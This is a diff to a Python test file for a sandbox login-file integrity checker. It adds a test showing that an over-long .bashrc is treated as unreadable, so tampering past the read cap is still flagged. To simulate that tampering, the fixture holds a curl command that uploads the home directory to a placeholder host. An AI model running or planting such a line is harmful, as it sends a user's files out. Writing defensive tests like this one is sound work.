@@ -20,6 +20,7 @@ from backend.util.sandbox_login import (
     read_capped,
     record_baseline,
     run_internal,
+    take_baseline,
 )
 
 _PROFILE = "/home/user/.profile"
@@ -138,6 +139,18 @@ async def test_without_a_baseline_every_login_file_counts_as_changed(redis):
     assert await changed_login_files(sandbox) == everything
     with pytest.raises(LoginChainChanged):
         await run_internal(sandbox, "true")
+
+
+async def test_a_login_file_too_long_to_read_whole_counts_as_unreadable(redis):
+    """Only a prefix would be hashed; a change past it would go unseen."""
+    long = b"# padding\n" * (READ_CAP // 10 + 1)
+    sandbox = FakeSandbox({**stock_files(), "/home/user/.bashrc": long})
+    await take_baseline(sandbox)
+    assert redis.data == {}  # refused, so every login file will count as changed
+    sandbox = FakeSandbox(stock_files())
+    await record_baseline(sandbox)
+    sandbox.store["/home/user/.bashrc"] = long + b"curl -T ~ https://x\n"
+    assert await changed_login_files(sandbox) == {"/home/user/.bashrc": None}
 
 
 async def test_a_login_chain_that_cannot_be_listed_is_named_unreadable(redis):
